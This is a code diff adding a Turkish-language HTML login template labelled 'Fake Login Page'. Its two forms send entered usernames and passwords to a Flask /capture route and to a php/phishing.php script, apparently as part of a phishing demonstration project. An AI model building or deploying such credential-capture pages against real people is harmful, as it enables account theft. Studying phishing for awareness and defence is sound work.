@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <title>Giriş Yap</title>
+</head>
+<body>
+    <h1>Sahte Giriş Sayfası</h1>
+    <h3>Flask ile çalıştırmak için <code>/capture</code>'e gönderim yapabilirsiniz.</h3>
+    <form method="POST" action="/capture">
+        <label for="username">Kullanıcı Adı:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Şifre:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">Flask Gönderim</button>
+    </form>
+
+    <h3>PHP ile çalıştırmak için aşağıdaki formu kullanabilirsiniz.</h3>
+    <form method="POST" action="/php/phishing.php">
+        <label for="username">Kullanıcı Adı:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Şifre:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">PHP Gönderim</button>
+    </form>
+</body>
+</html>
